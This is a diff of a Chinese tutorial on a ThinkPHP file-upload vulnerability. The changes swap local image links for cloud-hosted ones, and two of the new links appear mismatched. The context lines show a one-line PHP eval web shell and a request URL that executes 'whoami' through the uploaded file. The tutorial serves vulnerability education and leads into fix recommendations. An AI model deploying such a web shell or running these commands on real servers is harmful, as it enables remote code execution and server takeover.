@@ -102,11 +102,11 @@ public function upload(): string
 <?php @eval($_GET['shell']);?>
 ```
 
-![image-20230210211508569](/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20230210211508569.png)
+![image-20230210211508569](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20230210211508569.png)
 
 木马上传成功后，服务器会返回上传路径
 
-![image-20230210211537159](/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20230210211537159.png)
+![image-20230210211537159](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20230210213337685.png)
 
 `thinkphp`返回的路径是`public/storage`目录的相对路径，又因为`public`目录下的文件是公开的，所以添加上在路径前缀添加上`storage`后就可以直接访问。
 
@@ -114,7 +114,7 @@ public function upload(): string
 http://127.0.0.1/storage/topic/20230210/021f42ae42edae7a913d58e9f0da2107.php?shell=system(%27whoami%27);
 ```
 
-![image-20230210213337685](/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20230210213337685.png)
+![image-20230210213337685](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20230210211537159.png)
 
 ## 修复建议
 
